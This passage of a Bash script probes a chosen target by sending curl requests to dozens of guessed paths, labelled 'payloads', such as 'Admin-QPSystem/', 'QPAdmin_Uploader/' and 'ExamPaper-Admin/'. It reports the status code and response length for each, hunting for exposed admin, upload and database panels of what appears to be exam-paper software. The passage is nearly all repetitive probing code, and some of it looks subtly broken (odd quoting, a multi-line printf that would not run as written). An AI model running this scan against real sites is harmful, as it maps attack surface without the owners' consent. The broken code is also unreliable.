         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPService/"]: "
